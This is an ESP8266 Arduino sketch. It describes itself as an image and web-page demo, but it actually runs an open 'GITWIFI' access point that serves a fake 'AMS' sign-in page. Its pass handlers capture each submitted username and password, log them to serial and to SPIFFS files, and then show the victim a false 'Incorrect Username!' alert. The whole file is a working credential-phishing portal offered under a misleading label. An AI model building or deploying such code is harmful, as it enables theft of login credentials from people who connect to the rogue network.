
/*
   ESP8266 SPIFFS HTML Web Page with JPEG, PNG Image

*/

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <FS.h>   //Include File System Headers

const char* imagefile = "/image.png";
const char* htmlfile = "/index.html";

//ESP AP Mode configuration
const char *ssid = "GITWIFI";
const char *password = "password";
 const char index_html[] PROGMEM={"\n<!DOCTYPE HTML>\n<html>\n\n<meta http-equiv=\"content-type\" content=\"text/html;charset=UTF-8\" />\n<head>\n<title>AMS | Sign In</title>\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<script type=\"application/x-javascript\"> addEventListener(\"load\", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>\n <!-- Bootstrap Core CSS -->\n<link href=\"css/bootstrap.min.css\" rel='stylesheet' type='text/css' />\n<!-- Custom CSS -->\n<link href=\"css/style.css\" rel='stylesheet' type='text/css' />\n<!-- Graph CSS -->\n<link href=\"css/font-awesome.css\" rel=\"stylesheet\"> \n<!-- jQuery -->\n<!-- lined-icons -->\n<link rel=\"stylesheet\" href=\"css/icon-font.min.css\" type='text/css' />\n<!-- //lined-icons -->\n<!-- chart -->\n<script src=\"js/Chart.js\"></script>\n<!-- //chart -->\n<!--animate-->\n<link href=\"css/animate.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\">\n<script src=\"js/wow.min.js\"></script>\n\t<script>\n\t\t new WOW().init();\n\t</script>\n<!--//end-animate-->\n<!----webfonts--->\n<link href='../fonts.googleapis.com/css3821.css?family=Cabin:400,400italic,500,500italic,600,600italic,700,700italic' rel='stylesheet' type='text/css'>\n<!---//webfonts---> \n <!-- Meters graphs -->\n<script src=\"js/jquery-1.10.2.min.js\"></script>\n<!-- Placed js at the end of the document so the pages load faster -->\n\n</head> \n   \n <body class=\"sign-in-up\">\n    <section>\n\t\t\t<div id=\"page-wrapper\" class=\"sign-in-wrapper\">\n\t\t\t\t<div class=\"graphs\">\n\t\t\t\t\t<div class=\"sign-in-form\">\n\t\t\t\t\t\t<div class=\"sign-in-form-top\">\n\t\t\t\t\t\t\t<p><span>Sign In </span> </p>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"signin\">\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t<form action =\"checklogin.html\" method=\"GET\">\n\t\t\t\t\t\t\t<div class=\"log-input\">\n\t\t\t\t\t\t\t\t<div class=\"log-input-left\">\n\t\t\t\t\t\t\t\t   <input type=\"text\" class=\"user\"  name=\"u\" placeholder=\" Email Address\" autofocus />\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"log-input\">\n\t\t\t\t\t\t\t\t<div class=\"log-input-left\">\n\t\t\t\t\t\t\t\t   <input type=\"password\" class=\"lock\" name=\"p\" placeholder=\"Your Password\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"signin-rit\">\n\t\t\t\t\t\t\t\t<a href=\"forgot_password.html\"> Forgot Password ?</a>\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<input type=\"submit\" onclick=\"writeToPage()\" value=\"Login to your account\">\n\n\t\t\t\t\t\t</form>\n\t\t\t\t\t\t\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t</section>\n\t<center>\n\n</center>\n<script src=\"js/jquery.nicescroll.js\"></script>\n<script src=\"js/data.js\"></script>\n<script src=\"js/scripts.js\"></script>\n<!-- Bootstrap Core JavaScript -->\n   <script src=\"js/bootstrap.min.js\"></script>\n   \n\n</body>\n\n\n</html>\n"};

ESP8266WebServer server(4000);

ESP8266WebServer server1(80);

void handleRoot() {
 // server.sendHeader("Location", "/index.html", true);  //Redirect to our html web page
 // server.send(302, "text/plane", "");
 server.send_P(200, "text/html", index_html);
}

void handleRoot1() {
 // server1.sendHeader("Location", "/index1.html", true);  //Redirect to our html web page
//  server1.send(302, "text/plane", "");
 server.send_P(200, "text/html", index_html);
}

void handleWebRequests() {
  if (loadFromSpiffs(server.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) {
    message += " NAME:" + server.argName(i) + "\n VALUE:" + server.arg(i) + "\n";
  }
  server.send(404, "text/plain", message);
  Serial.println(message);
}


void handleWebRequests1() {
  if (loadFromSpiffs1(server1.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server1.uri();
  message += "\nMethod: ";
  message += (server1.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server1.args();
  message += "\n";
  for (uint8_t i = 0; i < server1.args(); i++) {
    message += " NAME:" + server1.argName(i) + "\n VALUE:" + server1.arg(i) + "\n";
  }
  server1.send(404, "text/plain", message);
  Serial.println(message);
}

void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();

  //Initialize File System
  SPIFFS.begin();
  Serial.println("File System Initialized");
  IPAddress ip(10, 1, 1, 2);
  IPAddress gateway(10, 1, 1, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(ip, gateway, subnet);
  //Initialize AP Mode
  WiFi.softAP(ssid);  //Password not used
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("Web Server IP:");
  Serial.println(myIP);

  //Initialize Webserver
  server.on("/", handleRoot);
  server.onNotFound(handleWebRequests); //Set setver all paths are not found so we can handle as per URI
  server.on("/checklogin.html", pass);
  server.begin();
  server1.on("/", handleRoot1);
  server1.onNotFound(handleWebRequests1); //Set setver all paths are not found so we can handle as per URI
  server1.on("/checklogin.html", pass1);
  server1.begin();
}

void pass()
{

  String Password = server.arg("p");
  String  Username = server.arg("u");
  Serial.println("");
  Serial.print("USERNAME AMS:");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD AMS:");
  Serial.print(Password);
  server.send(200, "text/html", "<script>alert(\"Incorrect Username!\");</script><script>window.location.assign(\"/\");</script>");
  File f = SPIFFS.open("/AMS.txt", "a");
if (!f) {
    Serial.println("file open failed");
     File f = SPIFFS.open("/AMS.txt", "a ");
}
    f.println("");
      f.print("USERNAME AMS:");
     f.print(Username);
      f.println("");
      f.print("PASSWORD AMS:");
     f.print(Password);
f.close();

}

void pass1()
{

  String Password = server1.arg("p");
  String  Username = server1.arg("u");
  Serial.println("");
  Serial.print("USERNAME GIT :");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD GIT :");
  Serial.print(Password);
  Serial.println("************************");


  server1.send(200, "text/html", "<script>alert(\"Incorrect Username!\");</script><script>window.location.assign(\"/\");</script>");


 
File f = SPIFFS.open("/GIT.txt", "a");
if (!f) {
    Serial.println("file open failed");
     File f = SPIFFS.open("/GIT.txt", "a ");
}
    f.println("");
      f.print("USERNAME AMS:");
     f.print(Username);
      f.println("");
      f.print("PASSWORD AMS:");
     f.print(Password);
f.close();

}



void loop() {
  server.handleClient();
  server1.handleClient();
}

bool loadFromSpiffs(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
  else if (path.endsWith(".html")) dataType = "text/html";
  else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server.hasArg("download")) dataType = "application/octet-stream";
  if (server.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}



bool loadFromSpiffs1(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index1.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
  else if (path.endsWith(".html")) dataType = "text/html";
  else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server1.hasArg("download")) dataType = "application/octet-stream";
  if (server1.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}

